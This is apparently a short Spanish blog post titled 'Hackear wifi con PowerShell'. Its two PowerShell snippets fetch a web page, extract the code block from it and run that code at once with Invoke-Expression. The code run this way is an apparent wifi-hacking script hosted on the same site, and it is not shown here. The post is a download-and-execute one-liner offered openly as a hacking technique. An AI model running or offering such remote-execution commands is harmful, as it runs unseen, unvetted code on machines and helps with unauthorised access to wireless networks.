# Hackear wifi con PowerShell (ejecutando un script remotamente)
## PowerShell, Wireless 
### URL: https://www.jesusninoc.com/2017/02/11/hackear-wifi-con-powershell-ejecutando-un-script-remotamente/
```PowerShell
$url="https://www.jesusninoc.com/2017/01/15/hackear-wifi-con-powershell/"
$result = Invoke-WebRequest $url
[String]$execute=$result.AllElements | Where class -eq 'crayon-pre' | %{$_.innerText}
Invoke-Expression ($execute)

```
```PowerShell
Invoke-Expression ((iwr "https://www.jesusninoc.com/2017/01/15/hackear-wifi-con-powershell/").AllElements | Where class -eq 'crayon-pre' | %{$_.innerText})

```
